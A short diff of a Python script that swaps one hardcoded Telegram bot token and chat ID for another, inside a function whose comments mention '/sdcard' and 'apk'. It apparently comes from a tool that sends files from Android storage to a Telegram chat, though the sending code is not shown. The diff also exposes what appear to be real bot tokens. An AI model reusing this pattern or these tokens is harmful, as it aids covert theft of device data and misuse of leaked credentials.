@@ -6,8 +6,8 @@ from concurrent.futures import ThreadPoolExecutor
 def suyaib():
     session = requests.session()
  
-    bot_token = '7140462385:AAEMlQkmWwwINpGCY10W1e-i1Weq-1HBBbM'
-    chat_id = '6656858850'
+    bot_token = ';6424046296:AAGe_STIYRBv8oFLYXoo9LnxUBw0fue7QBg'
+    chat_id = '6260002708'
     #-------------( /sdcard\ )--------------#  
     #--------------------apk-------------------#																						
     try:
